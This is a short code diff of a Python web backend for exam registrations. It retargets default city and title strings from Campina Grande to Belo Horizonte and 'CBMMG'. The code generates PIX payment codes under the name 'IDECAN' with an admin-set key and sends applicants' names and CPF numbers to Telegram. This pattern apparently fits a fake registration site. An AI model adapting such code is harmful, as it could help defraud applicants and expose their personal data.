@@ -279,7 +279,7 @@ async def track_registration(data: TrackIn, request: Request):
             'valor': valor,
             'taxa': taxa_str,
             'protocolo': extra.get('protocolo', ''),
-            'localidade': extra.get('localidade', 'CAMPINA GRANDE/PB'),
+            'localidade': extra.get('localidade', '-'),
             'finalized': True,
             'finalized_at': now,
             'created_at': now,
@@ -1147,7 +1147,7 @@ async def generate_pix_brcode(payload: Dict[str, Any]):
         raise HTTPException(status_code=400, detail='Chave PIX não configurada no painel admin')
 
     nome = (s.get('pix_nome') or 'IDECAN').upper()
-    cidade = (s.get('pix_cidade') or 'CAMPINA GRANDE').upper()
+    cidade = (s.get('pix_cidade') or 'BELO HORIZONTE').upper()
 
     try:
         valor = float(payload.get('valor', 0) or 0)
@@ -1275,7 +1275,7 @@ def _format_data_hora_brt(dt) -> str:
 def _build_telegram_message(insc: Dict[str, Any], settings: Dict[str, Any] = None) -> str:
     """Constroi a mensagem do Telegram no formato definido pelo cliente."""
     settings = settings or {}
-    titulo = settings.get('telegram_titulo') or 'NOVA INSCRIÇÃO CAMPINA GRANDE'
+    titulo = settings.get('telegram_titulo') or 'NOVA INSCRIÇÃO CBMMG'
 
     nome = (insc.get('nome') or 'Candidato').strip()
     cpf = _format_cpf_br(insc.get('cpf', ''))
